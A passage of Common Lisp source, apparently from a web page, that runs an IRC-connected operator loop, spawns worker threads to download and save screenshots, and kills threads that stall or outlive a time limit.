      (zpng:write-png png (format nil "~~/wnt/~A" fname-str)))
    t))

(defun task ()
  (destructuring-bind (str src)
      (task-data *current-task*)
    ;; (dbg ":: TF (~A): ~A: ~A~%" (length-of-queue) src str)
    (shot-downloader str src)))

(defparameter *operator*
  (lambda ()
    (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                               (bt:all-threads))))
      (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                              :do (when (equal name nm)  (return th))))
               (kill (th)  (handler-case (bt:destroy-thread th)
                             ;; happens, when thread destroyed already
                             (TYPE-ERROR () nil)
                             (SB-THREAD:INTERRUPT-THREAD-ERROR () nil)))
               (kill-op-irc (th)
                 (kill th)
                 (setf *watchdog-timer* 0)
                 (setf *op-connection-established-flag* nil))
               (clear ()
                 (bt:with-recursive-lock-held (*thread-operations-lock*)
                   (setf *task-threads*
                         (remove-if-not #'(lambda (pair)
                                            (bt:thread-alive-p (car pair)))
                                        *task-threads*)))))
        ;; if there is no irs-thread then start it
        (when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
                   (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
          (dbg ":: operator lambda: start irc-th~%")
          (setf *watchdog-timer* 0)
          (bt:make-thread
           #'op-irc :name "op-irc-th"
           :initial-bindings
           `((*standard-output* . ,*standard-output*)
             (*op-irc-thread-stop-flag* . ,*op-irc-th-stop-flag*))))
        ;; if there is irc-thread, but the watchdog-timer exceeds
        ;; or the flag is set - then kill it.
        (awhen (fnd "op-irc-th")
          (when (&gt; *watchdog-timer*  *watchdog-timer-max*)
            (dbg ":: operator-lambda: kill op-irc-th by WDG~%")
            (kill-op-irc it))
          (when *op-irc-th-stop-flag*
            (dbg ":: operator-lambda: kill op-irc-th by FLAG~%")
            (kill-op-irc it)))
        (when (&gt; (length *task-threads*) *max-task-thread-cnt*)
          (dbg ":: operator-lambda: many task threads~%")
          (loop :for (task-th . time) :in *task-threads* :do
               (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
               (when (&gt; (- (get-universal-time) time)
                        *max-task-thread-life-time*)
                 (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
                 (kill task-th)))
          (clear))
        (when (&lt; 0 (length-of-queue))
          (let* ((current-task (pop-task))
                 (bindings `((*standard-output* . ,*standard-output*)
                             (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                             (*current-task* . ,current-task)
                             (*op-sess* . ,*op-sess*)
                             (*op-user* . ,*op-user*)
                             (*op-serv* . ,*op-serv*)
                             (*op-chan* . ,*op-chan*)
                             (*op-lock* . ,*op-lock*)
                             (*op-conn* . ,*op-conn*)
                             (*watchdog-timer* . ,*watchdog-timer*))))
            (bt:with-recursive-lock-held (*thread-operations-lock*)
              (push (cons (bt:make-thread #'task :name "task-th"
                                          :initial-bindings bindings)
                          (get-universal-time))
                    *task-threads*))))
        ))))

(defun operator-loop ()
  (setf *watchdog-timer* 0)
  (tagbody
   infinite
     (when *operator-stop-flag*
       (go end))
     (dbg "~%:: operator-loop WGD=~3,'OD~%" *watchdog-timer*)
     (funcall *operator*)
     (sleep *sleep-interval*)
     (incf *watchdog-timer*)
     (go infinite)
   end))

(operator-loop)
</pre>
</div>
</div>
</div>
</div>
</body>
</html>
